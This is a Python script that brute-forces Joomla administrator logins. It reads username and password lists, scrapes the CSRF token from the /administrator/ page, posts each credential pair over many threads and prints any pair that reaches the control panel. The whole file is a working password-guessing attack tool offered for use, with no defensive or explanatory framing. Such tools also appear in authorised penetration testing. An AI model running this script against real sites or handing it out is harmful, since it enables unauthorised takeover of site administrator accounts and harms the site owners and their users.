#!/usr/bin/python3

import requests
import argparse
from bs4 import BeautifulSoup
from urllib.parse import urlparse
import threading
from queue import Queue
import random
import string


def generate_random_string(length):
    characters = string.ascii_letters + string.digits + string.punctuation
    return "".join(random.choice(characters) for _ in range(length))


class JoomlaBruteforce:
    def __init__(self):
        self.args = self.parse_arguments()
        self.proxy = self.get_proxy()
        self.queue = Queue()
        self.lock = threading.Lock()
        self.success = False
        self.payload_attempts = 0
        self.bruteforce()

    def parse_arguments(self):
        parser = argparse.ArgumentParser(description="Joomla login bruteforce")
        parser.add_argument("-u", "--url", required=True, type=str, help="Joomla site")

        passgroup = parser.add_mutually_exclusive_group(required=True)
        passgroup.add_argument("-p", type=str, help="One single password")
        passgroup.add_argument("-P", "--passlist", type=str, help="Password list")

        usergroup = parser.add_mutually_exclusive_group(required=True)
        usergroup.add_argument("-l", "--user", type=str, help="One single username")
        usergroup.add_argument("-L", "--userlist", type=str, help="Username list")

        parser.add_argument(
            "--proxy", type=str, help="Specify proxy. Optional. http://127.0.0.1:8080"
        )
        parser.add_argument(
            "-t",
            "--thread",
            type=int,
            help="Number of threads.",
        )

        return parser.parse_args()

    def get_proxy(self):
        if self.args.proxy:
            parsed_proxy = urlparse(self.args.proxy)
            return {parsed_proxy.scheme: parsed_proxy.netloc}
        return None

    def get_initial_cookies(self):
        try:
            response = requests.get(
                self.args.url + "/administrator/", proxies=self.proxy, timeout=5
            )
            response.raise_for_status()
            return response.cookies.get_dict()
        except requests.exceptions.ConnectionError:
            print("Error: No internet connection or unable to reach the server.")
            return False
        except Exception as e:
            print(f"Error: {e}")
            return False

    def bruteforce(self):
        users = self.get_users()
        passwords = self.get_passwords()

        for user in users:
            for password in passwords:
                self.queue.put((user, password))

        threads = []
        if not self.args.thread:
            self.args.thread = 10
        for _ in range(self.args.thread):
            thread = threading.Thread(target=self.handle_login_attempts)
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

    def get_users(self):
        if self.args.userlist:
            with open(self.args.userlist, "r", encoding="utf-8") as file:
                return file.read().splitlines()
        return [self.args.user]

    def get_passwords(self):
        try:
            with open(self.args.passlist, "r", encoding="utf-8") as file:
                return file.read().splitlines()
        except FileNotFoundError as e:
            print(f"Passlist not found: {e}")
            exit(1)

    def handle_login_attempts(self):

        session = requests.Session()

        while not self.queue.empty():
            user, password = self.queue.get()

            if self.attempt_login(session, user, password):
                if not self.success:
                    self.success = True
                    print(
                        f"[+] Valid user found:\n\tUser: {user}\n\tPassword: {password}"
                    )
                    self.queue.queue.clear()
                    return

            with self.lock:
                if not self.success:
                    self.payload_attempts += 1
                    if self.payload_attempts % 1 == 0:
                        print(f"Attacking[{self.payload_attempts}]: {user}:{password}")

            self.queue.task_done()

    def attempt_login(self, session, username, password):
        try:
            headers = {"User-Agent": "Joomla Password Finder"}

            cookie = session.get(self.args.url).cookies.get_dict()

            response = session.get(
                self.args.url + "/administrator/",
                proxies=self.proxy,
                cookies=cookie,
                headers=headers,
                timeout=5,
            )
            response.raise_for_status()

            soup = BeautifulSoup(response.text, "html.parser")
            csrf_token_elements = soup.find_all("input", type="hidden")
            if not csrf_token_elements:
                print("No CSRF token found.")
                return False

            csrf_token_name = csrf_token_elements[-1].get("name")

            data = {
                "username": username,
                "passwd": password,
                "option": "com_login",
                "task": "login",
                "return": "aW5kZXgucGhw",
                csrf_token_name: 1,
            }

            response = session.post(
                self.args.url + "/administrator/",
                data=data,
                proxies=self.proxy,
                headers=headers,
                timeout=5,
            )
            response.raise_for_status()

            soup = BeautifulSoup(response.text, "html.parser")
            panel_message = soup.find(string="Control Panel")
            if panel_message:
                return True
            return False

        except requests.exceptions.ConnectionError:
            print("Error: No internet connection or unable to reach the server.")
            return False
        except Exception as e:
            return False


if __name__ == "__main__":
    JoomlaBruteforce()
